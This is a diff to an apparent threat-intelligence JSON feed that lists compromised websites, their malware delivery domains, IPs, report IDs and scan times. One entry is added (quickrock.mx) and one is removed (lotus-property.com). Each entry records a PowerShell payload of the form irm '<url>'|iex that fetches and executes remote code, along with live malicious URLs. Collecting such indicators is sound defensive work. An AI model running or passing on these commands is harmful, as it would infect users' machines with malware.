@@ -1,5 +1,31 @@
 [
   {
+    "UrlDomain": "quickrock.mx",
+    "DeliveryUrl": [
+      "browse-login.info"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "77.37.83.116"
+    ],
+    "Related": [
+      {
+        "Value": "https://browse-login.info/a1472443e5d356fc",
+        "Type": "payload download"
+      },
+      {
+        "Value": "https://browse-login.info/api.php?s=7f6210a091c37ae9bfa1bfd2562d440d842370e171427c6b&amp;_v=29927357",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "irm 'browse-login[.]info/a1472443e5d356fc'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://browse-login.info/a1472443e5d356fc"
+    ],
+    "ReportId": "cmwwml14703ja0oml9rr46nl1",
+    "ScannedAt": "2026-11-25T21:18:15.069000+00:00"
+  },
+  {
     "UrlDomain": "heelyscanada.com",
     "DeliveryUrl": [
       "j7tracker.gb.net"
@@ -2786,29 +2812,5 @@
     ],
     "ReportId": "cmwr1ddfx28u30oml4qgsvp8u",
     "ScannedAt": "2026-11-21T23:25:34.994000+00:00"
-  },
-  {
-    "UrlDomain": "lotus-property.com",
-    "DeliveryUrl": [
-      "j7tracker.gb.net"
-    ],
-    "PayloadUrl": [
-      "https://j7tracker.gb.net/8pchkbdes5/6f6738d86905ea6c"
-    ],
-    "IP": [
-      "173.236.214.176"
-    ],
-    "Related": [
-      {
-        "Value": "https://www.instagram.com/lotusproperty1/",
-        "Type": "Reference"
-      }
-    ],
-    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/6f6738d86905ea6c')|iex",
-    "ResolvedDownloadUrl": [
-      "https://j7tracker.gb.net/8pchkbdes5/6f6738d86905ea6c"
-    ],
-    "ReportId": "cmwqx7aub28og0oml2cfuy2y3",
-    "ScannedAt": "2026-11-21T21:28:53.145000+00:00"
   }
 ]
